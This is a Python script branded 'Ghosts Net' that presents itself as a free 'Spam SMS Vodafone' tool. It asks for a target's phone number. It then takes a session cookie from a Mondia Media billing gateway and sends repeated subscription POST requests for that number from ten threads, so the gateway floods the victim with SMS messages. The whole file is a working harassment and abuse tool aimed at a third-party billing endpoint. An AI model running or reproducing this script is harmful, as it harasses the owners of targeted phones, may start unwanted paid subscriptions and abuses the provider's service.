# Decompiled By RandiSr
# Github : https://github.com/RANDIOLOY
import requests,json,random,string,termcolor,time,pyfiglet
from bs4 import BeautifulSoup
# -----------------------------------

logo = pyfiglet.figlet_format('Ghosts Net')
mb = pyfiglet.figlet_format("Spam SMS")
descr = """
 \x1b[0;33mBy: Mr Ghost
 
 \x1b[0;32mFacebook: https://www.facebook.com/ghostsnet4
 
 \x1b[0;35mTelegram: https://t.me/GhostsNet
 """
print(termcolor.colored(logo, color="red"), termcolor.colored(mb, color="green"),termcolor.colored(descr, color="red"))
print('\x1b[0;32m-' * 60)
des = """\x1b[0;37m Welcome To Script Spam SMS Vodafone"""
print(des)
print("\x1b[0;32m-"*60)
print()
print("\x1b[0;35mSpam SMS Vodafone Free Script :)")
print()
print("\x1b[0;32m$"*60)
print()
print("\x1b[0;32mالوقفة قصادنا صعبة بس أخذ الحق صنعه")
print()
print("\x1b[0;32m="*60)
print()
#--------------------------------------------------------------
try:
    import random
    import subprocess

    import requests

    import threading, time
except:
    subprocess.getoutput("pip install requests")
    subprocess.getoutput("pip install threading")
  
print('\x1b[0;31mScript Spam vodafone Number Write 1 To continue')
print()
put1 =input('\x1b[0;33mPut Your Choose : ')
print()
num_sms_send=5
number = input('\x1b[0;32mEnter the Number you are going to Send messages :')
print()
#--------------------------------------------------------------
masseg = 0
def vodafone():
    global num_sms_send
    global masseg
    url = 'https://login.mondiamediamena.com/billinggw-lcm/billing/submitmsisdn?paysmart'
    session = requests.session()
    good = session.get("https://login.mondiamediamena.com/billinggw-lcm/billing/submitmsisdn?paysmart")
    cook = good.cookies.get_dict()
    token = cook["BIGipServerbilling-gw-lcm.liv.arvm.de_http_pool"]
    data= {
        'merchantId': '35',
        'operatorId': '1',
        'redirect': 'http%3A%2F%2Fgalaxylp.mobi-mind.net%2FHome%2FMondiamediaNotification%3FId%3D842%2CMM%2C20%2C2695%2C412%2C%2C0%2C60202%2C5290%26TrackerID%3D59222268',
        'imgPath': 'http',
        'productCd': 'PLAYMANIAX',
        'subPackage': 'D',
        'prodName': 'Playmaniax',
        'prodPrice': '3.00',
        'currency': 'EGP',
        'method': 'subscribe',
        'txnId': '',
        'ATTEMPT_COUNT': '',
        'numPrefix': '',
        'multiFactor': '0.0',
        'partnerRef': '',
        'reqSource': 'From IP:192.168.192.7, Forwarded from IP:154.238.147.151, UA:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36',
        'freeTrialDays': '0',
        'secureHash': '',
        'checkForVodafoneSpainHeaderEnrichmentParam': 'true',
        'checkSecureHash': 'true',
        'campaignId': '',
        'passCode': token,
        'protectedMediaMode': 'ON_BLOCK_FRAUD',
        'protectedMediaEnvCode': 'L',
        'lcmPageContext': 'https://login.mondiamediamena.com/billinggw-lcm ',
        'wifiMode': 'WiFi',
        'operatorRef': '',
        'opticksClickId': '',
        'langCode': 'ar',
        'appHash': '',
        'cid': '',
        'hybridFlowType2': 'false',
        'msisdn': f'2{number}',

    }
#--------------------------------------------------------------
    while True:
        if str(num_sms_send) == str(masseg):
            break
        else:
            try:
                post = requests.post(url, data=data)
                #print(post.text)
                #MrGhost
                # print(post)
                masseg += 1
                print(f"\x1b[0;33 [+] Done Send {masseg} Massage\n")
            except:
                continue
if str(put1) == '1':
    t=vodafone
else:
    print()
    print('\x1b[0;31mEnter Vaild Number :)')
    exit()
#--------------------------------------------------------------
if __name__ == '__main__':
    threads = []
    for _ in range(10):
        thread = threading.Thread(target=t)
        threads.append(thread)
        thread.start()
